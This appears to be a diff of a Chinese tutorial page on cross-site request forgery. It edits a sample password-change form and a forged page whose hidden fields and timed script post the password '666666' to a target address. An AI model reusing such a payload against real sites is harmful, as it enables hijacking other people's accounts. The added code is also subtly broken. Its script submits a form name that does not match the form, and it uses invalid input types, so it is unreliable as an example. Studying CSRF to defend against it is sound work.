@@ -184,11 +184,11 @@ http://www.aa.com/opt.php?id=135&amp;act=del&amp;name=Tom的链接
     &lt;title&gt;aa&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
-    &lt;form action=&quot;http://172.23.10.200/index.php/User/Index/RegisterUpdate/id/286&quot; method=&quot;post&quot;&gt;
-        昵称：&lt;input type=&quot;text&quot; name=&quot;password&quot; id=&quot;password&quot; class=&quot;form-control&quot; value=&quot;xxxxx&quot;&gt;
-        用户名：&lt;input type=&quot;text&quot; name=&quot;password&quot; id=&quot;password&quot; class=&quot;form-control&quot; value=&quot;xiaoming&quot;&gt;
-        密码：&lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot; class=&quot;form-control&quot; value=&quot;&quot;&gt;
-        确认密码：&lt;input type=&quot;password&quot; name=&quot;cpassword&quot; id=&quot;conpassword&quot; class=&quot;form-control&quot; value=&quot;&quot;&gt;
+    &lt;form action=&quot;http://172.23.10.200/setpasswd.php&quot; method=&quot;post&quot;&gt;
+        昵称：&lt;input type=&quot;text&quot; name=&quot;nickname&quot; id=&quot;nickname&quot; value=&quot;xxxxx&quot;&gt;
+        用户名：&lt;input type=&quot;text&quot; name=&quot;name&quot; id=&quot;name&quot; value=&quot;xiaoming&quot;&gt;
+        密码：&lt;input type=&quot;passwd&quot; name=&quot;passwd&quot; id=&quot;passwd&quot; value=&quot;&quot;&gt;
+        确认密码：&lt;input type=&quot;rpasswd&quot; name=&quot;rpasswd&quot; id=&quot;rpasswd&quot; value=&quot;&quot;&gt;
         &lt;input type=&quot;submit&quot; name=&quot;button&quot; value=&quot;提交&quot;&gt;
     &lt;/form&gt;
 &lt;/body&gt;
@@ -201,11 +201,14 @@ http://www.aa.com/opt.php?id=135&amp;act=del&amp;name=Tom的链接
 &lt;head&gt;
     &lt;title&gt;aa&lt;/title&gt;
 &lt;/head&gt;
-&lt;body onLoad=&quot;document.forms[0].submit()&quot;&gt;
-    &lt;form action=&quot;http://172.23.10.200/index.php/User/Index/RegisterUpdate/id/286&quot; method=&quot;post&quot;&gt;
-        &lt;input type=&quot;hidden&quot; name=&quot;password&quot; id=&quot;password&quot; value=&quot;666666&quot;&gt;
-        &lt;input type=&quot;hidden&quot; name=&quot;cpassword&quot; id=&quot;conpassword&quot; value=&quot;666666&quot;&gt;
+&lt;body&gt;
+    &lt;form name=&quot;csrf&quot; action=&quot;http://172.23.10.200/setpasswd.php&quot; method=&quot;post&quot;&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;passwd&quot; id=&quot;passwd&quot; value=&quot;666666&quot;&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;rpasswd&quot; id=&quot;rpasswd&quot; value=&quot;666666&quot;&gt;
     &lt;/form&gt;
+    &lt;script&gt;
+        setTimeout(&quot;document.form8320.submit()&quot;,100);
+    &lt;/script&gt;
 &lt;/body&gt;
 &lt;/html&gt;
 </code></pre>
